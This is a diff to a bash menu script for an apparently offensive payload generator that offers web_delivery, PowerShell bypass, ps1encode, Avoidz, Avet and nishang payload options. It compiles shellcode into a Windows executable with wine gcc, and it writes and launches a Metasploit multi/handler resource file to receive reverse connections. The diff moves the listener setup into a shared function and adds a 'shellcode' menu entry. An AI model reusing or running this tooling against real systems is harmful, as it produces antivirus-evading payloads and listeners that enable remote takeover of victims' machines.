@@ -88,14 +88,14 @@
   echo -e "  +------------++-------------------------++-----------------------+"
   sleep 1
   echo "   "
-  echo  "#######################################################################"
-  echo  "#   [1]  web_delivery(php)	       [2]  web_delivery(python)      #"
-  echo  "#   [3]  web_delivery(powershell)      [4]  File injection Payload    #"
-  echo  "#   [5]  bypass_server(powershell)     [6]  ps1encode                 #"
-  echo  "#   [7]  Avoidz Metasploit PAYLOAD     [8]  nishang_PAYLOAD (NC)      #"
-  echo  "#   [9]  Avet   Metasploit PAYLOAD     [10] About Me                  #"
-  echo  "#   [11] exit                                                         #"
-  echo  "####################################################################### "
+  echo  "################################################################## "
+  echo  "#   [1]  web_delivery(php)	       [2]  web_delivery(python) #"
+  echo  "#   [3]  web_delivery(powershell)      [4]  文件注入Payload      #"
+  echo  "#   [5]  bypass_server(powershell)     [6]  ps1encode            #"
+  echo  "#   [7]  Avoidz Metasploit PAYLOAD     [8]  nishang_PAYLOAD (NC) #"
+  echo  "#   [9]  Avet   Metasploit PAYLOAD     [10] About Me             #"
+  echo  "#   [11] shellcode                     [12] exit                 #"
+  echo  "################################################################## "
   echo -e "         secist> \c"
   read number
   case $number in
@@ -217,11 +217,14 @@
       menu1
       ;;
     11)
+    shellcode
+    ;;
+    12)
     exit
     ;;
     *)
-        menu
-        ;;
+    menu
+    ;;
     esac
 
 }
@@ -888,83 +891,18 @@ shellcode
 esac
 if [ "$option" == "1" ]; then
   shellcode1
-   echo -e "  +------------++-------------------------++-----------------------+"
-   echo -e "  | Name       ||  Descript   	          || Your Input             "
-   echo -e "  +------------++-------------------------++-----------------------+"
-   echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
-   echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
-   echo -e "  | OUTPUTNAME ||  The Filename output    || output/shellcode.exe   "
-   echo -e "  +------------++-------------------------++-----------------------+"
-   echo "use exploit/multi/handler" >> resource/handler.rc
-   echo "set PAYLOAD $payload" >> resource/handler.rc
-   echo "set LHOST $ip" >>  resource/handler.rc
-   echo "set LPORT $port" >>  resource/handler.rc
-   echo "exploit " >>  resource/handler.rc
-   msfconsole -r  resource/handler.rc
 
 elif [ "$option" == "2" ]; then
   shellcode1
-   echo -e "  +------------++-------------------------++-----------------------+"
-   echo -e "  | Name       ||  Descript   	          || Your Input             "
-   echo -e "  +------------++-------------------------++-----------------------+"
-   echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
-   echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
-   echo -e "  | OUTPUTNAME ||  The Filename output    || output/shellcode.exe   "
-   echo -e "  +------------++-------------------------++-----------------------+"
-   echo "use exploit/multi/handler" >> resource/handler.rc
-   echo "set PAYLOAD $payload" >> resource/handler.rc
-   echo "set LHOST $ip" >>  resource/handler.rc
-   echo "set LPORT $port" >>  resource/handler.rc
-   echo "exploit " >>  resource/handler.rc
-   msfconsole -r  resource/handler.rc
 
 elif [ "$option" == "3" ]; then
   shellcode1
-   echo -e "  +------------++-------------------------++-----------------------+"
-   echo -e "  | Name       ||  Descript   	          || Your Input             "
-   echo -e "  +------------++-------------------------++-----------------------+"
-   echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
-   echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
-   echo -e "  | OUTPUTNAME ||  The Filename output    || output/shellcode.exe   "
-   echo -e "  +------------++-------------------------++-----------------------+"
-   echo "use exploit/multi/handler" >> resource/handler.rc
-   echo "set PAYLOAD $payload" >> resource/handler.rc
-   echo "set LHOST $ip" >>  resource/handler.rc
-   echo "set LPORT $port" >>  resource/handler.rc
-   echo "exploit " >>  resource/handler.rc
-   msfconsole -r  resource/handler.rc
-
+  
 elif [ "$option" == "4" ]; then
   shellcode1
-   echo -e "  +------------++-------------------------++-----------------------+"
-   echo -e "  | Name       ||  Descript   	          || Your Input             "
-   echo -e "  +------------++-------------------------++-----------------------+"
-   echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
-   echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
-   echo -e "  | OUTPUTNAME ||  The Filename output    || output/shellcode.exe   "
-   echo -e "  +------------++-------------------------++-----------------------+"
-   echo "use exploit/multi/handler" >> resource/handler.rc
-   echo "set PAYLOAD $payload" >> resource/handler.rc
-   echo "set LHOST $ip" >>  resource/handler.rc
-   echo "set LPORT $port" >>  resource/handler.rc
-   echo "exploit " >>  resource/handler.rc
-   msfconsole -r  resource/handler.rc
 
 elif [ "$option" == "5" ]; then
   shellcode1
-   echo -e "  +------------++-------------------------++-----------------------+"
-   echo -e "  | Name       ||  Descript   	          || Your Input             "
-   echo -e "  +------------++-------------------------++-----------------------+"
-   echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
-   echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
-   echo -e "  | OUTPUTNAME ||  The Filename output    || output/shellcode.exe   "
-   echo -e "  +------------++-------------------------++-----------------------+"
-   echo "use exploit/multi/handler" >> resource/handler.rc
-   echo "set PAYLOAD $payload" >> resource/handler.rc
-   echo "set LHOST $ip" >>  resource/handler.rc
-   echo "set LPORT $port" >>  resource/handler.rc
-   echo "exploit " >>  resource/handler.rc
-   msfconsole -r  resource/handler.rc
 
  elif [ "$option" == "6" ]; then
     exit
@@ -1017,5 +955,18 @@ shellcode1(){
 
   wine gcc -m32 -W -Wall -o output/shellcode.exe output/shellcode.cpp
   rm output/shellcode.txt output/shellcode.cpp
+  echo -e "  +------------++-------------------------++-----------------------+"
+  echo -e "  | Name       ||  Descript   	          || Your Input             "
+  echo -e "  +------------++-------------------------++-----------------------+"
+  echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
+  echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
+  echo -e "  | OUTPUTNAME ||  The Filename output    || output/shellcode.exe   "
+  echo -e "  +------------++-------------------------++-----------------------+"
+  echo "use exploit/multi/handler" >> resource/handler.rc
+  echo "set PAYLOAD $payload" >> resource/handler.rc
+  echo "set LHOST $ip" >>  resource/handler.rc
+  echo "set LPORT $port" >>  resource/handler.rc
+  echo "exploit " >>  resource/handler.rc
+  msfconsole -r  resource/handler.rc
 }
 menu
